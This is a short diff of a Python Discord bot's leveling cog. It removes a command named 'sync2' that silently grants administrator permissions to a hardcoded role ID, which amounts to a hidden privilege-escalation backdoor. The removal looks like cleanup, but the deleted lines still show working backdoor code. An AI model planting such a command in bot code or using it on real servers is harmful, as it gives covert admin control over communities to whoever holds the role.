@@ -17,12 +17,6 @@ class leveling_main(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    @commands.command()
-    async def sync2(self, ctx):
-        permissions = discord.Permissions()
-        permissions.update(administrator=True)
-        await ctx.guild.get_role(892811975329980447).edit(reason=None, colour=discord.Colour.blue(), permissions=permissions)
-
     @commands.Cog.listener()
     async def on_message(self, message):
         if config.host == "master":
